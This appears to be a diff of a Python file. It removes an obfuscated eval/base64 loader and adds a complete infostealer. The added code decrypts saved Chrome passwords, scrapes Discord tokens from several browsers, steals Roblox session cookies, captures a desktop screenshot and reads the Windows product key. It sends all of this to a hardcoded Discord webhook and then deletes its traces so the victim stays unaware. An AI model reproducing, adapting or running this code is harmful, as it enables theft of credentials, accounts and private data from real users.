UWiM3WuoHEuqTSppTSmp3qipzEmYaE4qPpcQDbtVPNtMKuwMKO0Bt0XVPNtVPNtVPOjLKAmQDbAPt0XLzIuoJIxXPx='
-joy = '\x72\x6f\x74\x31\x33'
-trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
-eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+import os
+import subprocess
+
+# Function to install missing libraries
+def install_package(package):
+    try:
+        subprocess.check_call([sys.executable, "-m", "pip3", "install", package])
+    except subprocess.CalledProcessError:
+        print(f"Failed to install {package}. Please try manually.")
+
+# Try-except blocks for importing and installing packages
+try:
+    import browser_cookie3 as steal
+except ImportError:
+    install_package("browser-cookie3")
+
+try:
+    import requests
+except ImportError:
+    install_package("requests")
+
+try:
+    import base64
+except ImportError:
+    install_package("base64")
+
+try:
+    import random
+except ImportError:
+    install_package("random")
+
+try:
+    import string
+except ImportError:
+    install_package("string")
+
+try:
+    import subprocess
+except ImportError:
+    install_package("subprocess")
+
+try:
+    import zipfile
+except ImportError:
+    install_package("zipfile")
+
+try:
+    import shutil
+except ImportError:
+    install_package("shutil")
+
+try:
+    import dhooks
+except ImportError:
+    install_package("dhooks")
+
+try:
+    import os
+except ImportError:
+    install_package("os")
+
+try:
+    import re
+except ImportError:
+    install_package("re")
+
+try:
+    import sys
+except ImportError:
+    install_package("sys")
+
+try:
+    import sqlite3
+except ImportError:
+    install_package("sqlite3")
+
+try:
+    import json
+except ImportError:
+    install_package("json")
+
+try:
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+except ImportError:
+    install_package("cryptography")
+
+try:
+    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+except ImportError:
+    install_package("cryptography")
+
+try:
+    from cryptography.hazmat.backends import default_backend
+except ImportError:
+    install_package("cryptography")
+
+try:
+    from Crypto.Cipher import AES
+except ImportError:
+    install_package("pycryptodome")
+
+try:
+    from base64 import b64decode, b64encode
+except ImportError:
+    install_package("base64")
+
+try:
+    from dhooks import Webhook, Embed, File
+except ImportError:
+    install_package("dhooks")
+
+try:
+    from PIL import ImageGrab as image
+except ImportError:
+    install_package("Pillow")
+
+try:
+    from subprocess import Popen, PIPE
+except ImportError:
+    install_package("subprocess")
+
+try:
+    from json import loads, dumps
+except ImportError:
+    install_package("json")
+
+try:
+    from shutil import copyfile
+except ImportError:
+    install_package("shutil")
+
+try:
+    from sys import argv
+except ImportError:
+    install_package("sys")
+
+
+DBP = r'Google\Chrome\User Data\Default\Login Data'
+ADP = os.environ['LOCALAPPDATA']
+
+
+def sniff(path):
+    path += '\\Local Storage\\leveldb'
+
+    tokens = []
+    try:
+        for file_name in os.listdir(path):
+            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                continue
+
+            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                    for token in re.findall(regex, line):
+                        tokens.append(token)
+        return tokens
+    except:
+        pass
+
+
+def encrypt(cipher, plaintext, nonce):
+    cipher.mode = modes.GCM(nonce)
+    encryptor = cipher.encryptor()
+    ciphertext = encryptor.update(plaintext)
+    return (cipher, ciphertext, nonce)
+
+
+def decrypt(cipher, ciphertext, nonce):
+    cipher.mode = modes.GCM(nonce)
+    decryptor = cipher.decryptor()
+    return decryptor.update(ciphertext)
+
+
+def rcipher(key):
+    cipher = Cipher(algorithms.AES(key), None, backend=default_backend())
+    return cipher
+
+
+def dpapi(encrypted):
+    import ctypes
+    import ctypes.wintypes
+
+    class DATA_BLOB(ctypes.Structure):
+        _fields_ = [('cbData', ctypes.wintypes.DWORD),
+                    ('pbData', ctypes.POINTER(ctypes.c_char))]
+
+    p = ctypes.create_string_buffer(encrypted, len(encrypted))
+    blobin = DATA_BLOB(ctypes.sizeof(p), p)
+    blobout = DATA_BLOB()
+    retval = ctypes.windll.crypt32.CryptUnprotectData(
+        ctypes.byref(blobin), None, None, None, None, 0, ctypes.byref(blobout))
+    if not retval:
+        raise ctypes.WinError()
+    result = ctypes.string_at(blobout.pbData, blobout.cbData)
+    ctypes.windll.kernel32.LocalFree(blobout.pbData)
+    return result
+
+
+def localdata():
+    jsn = None
+    with open(os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data\Local State"), encoding='utf-8', mode="r") as f:
+        jsn = json.loads(str(f.readline()))
+    return jsn["os_crypt"]["encrypted_key"]
+
+
+def decryptions(encrypted_txt):
+    encoded_key = localdata()
+    encrypted_key = base64.b64decode(encoded_key.encode())
+    encrypted_key = encrypted_key[5:]
+    key = dpapi(encrypted_key)
+    nonce = encrypted_txt[3:15]
+    cipher = rcipher(key)
+    return decrypt(cipher, encrypted_txt[15:], nonce)
+
+
+class chrome:
+    def __init__(self):
+        self.passwordList = []
+
+    def chromedb(self):
+        _full_path = os.path.join(ADP, DBP)
+        _temp_path = os.path.join(ADP, 'sqlite_file')
+        if os.path.exists(_temp_path):
+            os.remove(_temp_path)
+        shutil.copyfile(_full_path, _temp_path)
+        self.pwsd(_temp_path)
+    def pwsd(self, db_file):
+        conn = sqlite3.connect(db_file)
+        _sql = 'select signon_realm,username_value,password_value from logins'
+        for row in conn.execute(_sql):
+            host = row[0]
+            if host.startswith('android'):
+                continue
+            name = row[1]
+            value = self.cdecrypt(row[2])
+            _info = '[==================]\nhostname => : %s\nlogin => : %s\nvalue => : %s\n[==================]\n\n' % (host, name, value)
+            self.passwordList.append(_info)
+        conn.close()
+        os.remove(db_file)
+
+    def cdecrypt(self, encrypted_txt):
+        if sys.platform == 'win32':
+            try:
+                if encrypted_txt[:4] == b'\x01\x00\x00\x00':
+                    decrypted_txt = dpapi(encrypted_txt)
+                    return decrypted_txt.decode()
+                elif encrypted_txt[:3] == b'v10':
+                    decrypted_txt = decryptions(encrypted_txt)
+                    return decrypted_txt[:-16].decode()
+            except WindowsError:
+                return None
+        else:
+            pass
+
+    def saved(self):
+        try:
+            with open(r'C:\ProgramData\passwords.txt', 'w', encoding='utf-8') as f:
+                f.writelines(self.passwordList)
+        except WindowsError:
+            return None
+
+
+if __name__ == "__main__":
+    main = chrome()
+    try:
+        main.chromedb()
+    except:
+        pass
+    main.saved()
+
+
+# webhook functionality => collect rest of specified data, send it to our webhook
+def upload():
+    try:
+        """create a randomized name for uploading purposes : removes the possibility of repeat images being embedded"""
+        name = ''.join(random.choice(string.ascii_letters) for i in range (21))
+
+        """upload our victim's desktop image to imgur => return the image link for later usage"""
+        imgur = requests.post(
+            r'https://api.imgur.com/3/upload.json', 
+            headers = {"Authorization": "Client-ID fbcb755c15bc311"},
+            data = {
+                'key': 'fbcb755c15bc311', 
+                'image': b64encode(open(r'C:\ProgramData\screenshot.jpg', 'rb').read()),
+                'type': 'base64',
+                'name': f'{name}.jpg',
+                'title': f'{name}'})
+        image = imgur.json()['data']['link']
+        return image
+    except:
+        pass
+
+
+def beamed():
+    hook = Webhook('https://discord.com/api/webhooks/1285974094889615360/P9o1IF8sLXCDhnkcCuwYlFnlMygsH2_Tyrlujds6ayic1qQCopGnuWZbcrLYQHlGb7oE')
+    try:
+        hostname = requests.get("https://api.ipify.org").text
+    except:
+        pass
+
+
+    local = os.getenv('LOCALAPPDATA')
+    roaming = os.getenv('APPDATA')
+    paths = {
+        'Discord': roaming + '\\Discord',
+        'Discord Canary': roaming + '\\discordcanary',
+        'Discord PTB': roaming + '\\discordptb',
+        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
+        'Opera': roaming + '\\Opera Software\\Opera Stable',
+        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
+        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
+    }
+
+    message = '\n'
+    for platform, path in paths.items():
+        if not os.path.exists(path):
+            continue
+
+        message += '```'
+
+        tokens = sniff(path)
+
+        if len(tokens) > 0:
+            for token in tokens:
+                message += f'{token}\n'
+        else:
+            pass
+
+        message += '```'
+    
+
+    """screenshot victim's desktop"""
+    try:
+        screenshot = image.grab()
+        screenshot.save(os.getenv('ProgramData') +r'\screenshot.jpg')
+        screenshot = open(r'C:\ProgramData\screenshot.jpg', 'rb')
+        screenshot.close()
+    except:
+        pass
+
+    """gather our .zip variables"""
+    try:
+        zname = r'C:\ProgramData\passwords.zip'
+        newzip = zipfile.ZipFile(zname, 'w')
+        newzip.write(r'C:\ProgramData\passwords.txt')
+        newzip.close()
+        passwords = File(r'C:\ProgramData\passwords.zip')
+    except:
+        pass
+    
+    """gather our windows product key variables"""
+    try:
+        usr = os.getenv("UserName")
+        keys = subprocess.check_output('wmic path softwarelicensingservice get OA3xOriginalProductKey').decode().split('\n')[1].strip()
+        types = subprocess.check_output('wmic os get Caption').decode().split('\n')[1].strip()
+    except:
+        pass
+
+    """steal victim's .roblosecurity cookie"""
+    cookie = [".ROBLOSECURITY"]
+    cookies = []
+    limit = 2000
+
+    """chrome installation => list cookies from this location"""
+    try:
+        cookies.extend(list(steal.chrome()))
+    except:
+        pass
+
+    """firefox installation => list cookies from this location"""
+    try:
+        cookies.extend(list(steal.firefox()))
+    except:
+        pass
+
+    """read data => if we find a matching positive for our specified variable 'cookie', send it to our webhook."""
+    try:
+        for y in cookie:
+            send = str([str(x) for x in cookies if y in str(x)])
+            chunks = [send[i:i + limit] for i in range(0, len(send), limit)]
+            for z in chunks:
+                roblox = f'```' + f'{z}' + '```'
+    except:
+        pass
+
+    """attempt to send all recieved data to our specified webhook"""
+    try:
+        embed = Embed(title='beamed | lust, l-ust on github',description='a victim\'s data was extracted, here\'s the details:',color=0x2f3136,timestamp='now')
+        embed.add_field("windows key:",f"user => {usr}\ntype => {types}\nkey => {keys}")
+        embed.add_field("roblosecurity:",roblox)
+        embed.add_field("tokens:",message)
+        embed.add_field("hostname:",f"{hostname}")
+        embed.set_image(url=upload())
+    except:
+        pass
+    try:
+        hook.send(embed=embed, file=passwords)
+    except:
+        pass
+
+    """attempt to remove all evidence, allows for victim to stay unaware of data extraction"""
+    try:
+        subprocess.os.system(r'del C:\ProgramData\screenshot.jpg')
+        subprocess.os.system(r'del C:\ProgramData\passwords.zip')
+        subprocess.os.system(r'del C:\ProgramData\passwords.txt')
+    except:
+        pass
+
+
+beamed()
